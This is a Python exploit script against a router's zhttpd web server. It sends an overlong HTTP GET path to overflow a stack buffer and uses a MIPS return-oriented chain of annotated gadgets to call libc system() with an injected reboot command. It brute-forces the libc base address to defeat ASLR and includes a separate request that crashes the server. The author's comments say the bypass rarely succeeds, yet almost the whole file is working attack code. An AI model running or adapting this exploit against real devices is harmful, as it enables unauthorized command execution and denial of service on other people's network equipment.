import socket
import struct
import time
import random
import ssl
from multiprocessing import Pool


## This is my attempt at bypassing ASLR, but it doesn't quite work (very rarely).
## The device freezed up after a few attempts.
## Your best bet is to find a different vuln to leak the libc base addr.

HOST = '192.168.1.1'
PORT = 80
SSLPORT = 443

i = 0

def kill_server():
	global HOST, PORT, SSLPORT

	print("killing server...")	

	request = (
		b"GET /" +
		(b"X" * 251) + b"\xFF\xFF\xFF\xFF" +
		b" HTTP/1.0\nHost: 192.168.0.1\n\n"
	)


	try:
		# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# s.connect((HOST, PORT))
		# s.send(request)
		# s.close()

		context = ssl.create_default_context()
		context.check_hostname = False
		context.verify_mode = ssl.CERT_NONE

		sock = socket.create_connection((HOST, SSLPORT))
		s = context.wrap_socket(sock, server_hostname=HOST)
		s.send(request)
		s.close()
	except (ConnectionRefusedError, OSError, ConnectionResetError):
		pass


def is_server_alive():
	request = (
		b"GET /getBasicInformation HTTP/1.0\r\n" +
		b"Host: a\r\n\r\n"
	)

	res = None
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))
		s.settimeout(2)
		s.send(request)
		res = s.recv(12)
		s.close()

		if b"200" in res:
			return True
	except:
		return False
	return False



def send_bof(base_libc):
	global i, HOST, PORT, SSLPORT


	i += 1

	# Gadget to control $s0-$s6 (base 0x10000)
	#    0006a4d8 8f bf 00 3c     lw         ra,local_4(sp)
	#    0006a4dc 8f b6 00 38     lw         s6,local_8(sp)
	#    0006a4e0 8f b5 00 34     lw         s5,local_c(sp)
	#    0006a4e4 8f b4 00 30     lw         s4,local_10(sp)
	#    0006a4e8 8f b3 00 2c     lw         s3,local_14(sp)
	#    0006a4ec 8f b2 00 28     lw         s2,local_18(sp)
	#    0006a4f0 8f b1 00 24     lw         s1,local_1c(sp)
	#    0006a4f4 8f b0 00 20     lw         s0,local_20(sp)
	#    0006a4f8 03 e0 00 08     jr         ra
	#    0006a4fc 27 bd 00 40     _addiu     sp,sp,0x40

	# Gadget to set $a0:

	# 0007db40 27 a4 00 18     _addiu     a0,sp,0x18
	# 0007db44 8f bf 00 2c     lw         ra,local_4(sp)
	# 0007db48 03 e0 00 08     jr         ra


	# Gadget to set $t9
	# 0002b414 02 a0 c8 21     move       t9,s5
	# 0002b418 03 20 f8 09     jalr       t9
	# 0002b41c 00 00 00 00     _nop

	off_system = 0x0006bf48

	gadget1 = struct.pack(">I", base_libc + 0x5a4d8)
	gadget2 = struct.pack(">I", base_libc + 0x6db40)
	gadget3 = struct.pack(">I", base_libc + 0x1b414)

	final_addr = base_libc + off_system
	# final_addr = 0x01020304

	t9_bytes = struct.pack(">I", final_addr)

	cmd_20 = b"reboot\t#aaaaaaaaaaaa"
	assert(len(cmd_20) == 20)
	# cmd_20 = b"aaaaaaaaaaaaaaaaaa" + b"\t#"
	# cmd_20 = b"echo\tXXXX>>/tmp/x" + b"\t#"

	# 519 chars
	pre_payload = b"aaaabaaacaaadaa" + t9_bytes + b"afaa" + gadget2 + b"ahaaaiaaajaaakaaalaaamaa" + cmd_20 + gadget3 + b"ataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaa"
	assert(len(pre_payload) == 519)


	request = (
		b"GET /" +
		pre_payload +
		gadget1 +
		b"123" +
		b" HTTP/1.0\nHost: 192.168.0.1\n\n"
	)


	print(f"{i}: trying libc @ 0x{base_libc:x}...")


	try:
		# context = ssl.create_default_context()
		# context.check_hostname = False
		# context.verify_mode = ssl.CERT_NONE

		# sock = socket.create_connection((HOST, SSLPORT))
		# s = context.wrap_socket(sock, server_hostname=HOST)
		# s.send(request)
		# sock.close()

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))
		s.send(request)
		s.close()

	except (ConnectionRefusedError, ConnectionResetError):
		print(f"connection refused/reset...")
		return False

	return True



def run_attempts(num):
	global HOST, SSLPORT

	# for i in `seq 1 1024`; do ldd /bin/zhttpd | grep /lib/libc.so | awk '{print $4}'; done | sort
	# uniq -c addrs.txt | sort -rn | head -n 10
	likely_libc_addrs = list(range(0x76001000, 0x77fff000, 0x2000))
	random.shuffle(likely_libc_addrs)

	# Grab first `num` addrs
	likely_libc_addrs = likely_libc_addrs[:num]

	for idx, base_libc in enumerate(likely_libc_addrs):
		# if not is_server_alive():
		# 	print("server no longer responding..")
		# 	break

		successful = send_bof(base_libc)
		if not successful:
			break

		time.sleep(0.2)


while True:
	try:
		run_attempts(20)
		kill_server()
		time.sleep(5)
	except OSError:
		# No route to host == reboot worked!
		break

print("Stopping with OSError -> router rebooting?!")